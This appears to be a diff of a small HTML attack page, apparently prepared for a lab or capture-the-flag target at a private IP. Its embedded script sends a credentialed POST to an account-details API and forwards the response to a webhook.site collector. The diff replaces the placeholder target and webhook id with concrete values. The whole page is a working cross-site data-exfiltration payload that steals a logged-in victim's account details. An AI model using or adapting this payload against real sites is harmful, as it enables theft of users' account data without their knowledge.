@@ -2,7 +2,7 @@
 <html>
   <body>
     <script>
-      fetch("http://target/api/account/details", {
+      fetch("http://192.168.213.213:3000/api/account/details", {
         method: "POST",
         credentials: "include",
         headers: {
@@ -17,7 +17,7 @@
       })
       .then(res => res.text())
       .then(data => {
-        fetch("https://webhook.site/TON_ID", {
+        fetch("https://webhook.site/0b2723a8-ea63-4f7b-9f87-84d2b4a43243", {
           method: "POST",
           body: data
         });
